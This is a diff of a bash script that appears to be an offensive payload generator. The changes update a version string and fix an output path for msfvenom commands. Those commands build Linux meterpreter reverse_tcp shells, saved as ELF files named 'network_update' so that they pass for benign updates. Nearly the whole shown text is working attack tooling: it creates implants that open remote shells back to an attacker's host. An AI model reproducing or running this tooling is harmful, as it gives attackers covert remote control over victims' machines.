@@ -4,7 +4,7 @@ readonly RED="\e[1;31m"
 readonly GREEN="\e[1;32m"
 readonly YELLOW="\e[1;33m"
 readonly RESET="\e[0m"
-readonly VERSION="v.0.0.4"
+readonly VERSION="v.0.0.4 bugfix"
 readonly NOTES="Only available for Windows for now..."
 
 echo -e "${RED}"
@@ -53,8 +53,8 @@ elif [ "$1" == "-gp" ]; then
                 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.64b.elf
                 echo -e "${GREEN}[+] Payload generated!"
         elif [ "$OS" == "linux" ] && [ "$architecture" == "x86" ]; then
-                echo -e "Generating $OS $architecture payload...${RESET}"
-                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o network_update.32b.elf
+                echo -e "[*] Generating $OS $architecture payload...${RESET}"
+                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf -o payloads/network_update.32b.elf
                 echo -e "${GREEN}[+] Payload generated!"
         fi
 elif [ "$1" == "-lc" ]; then
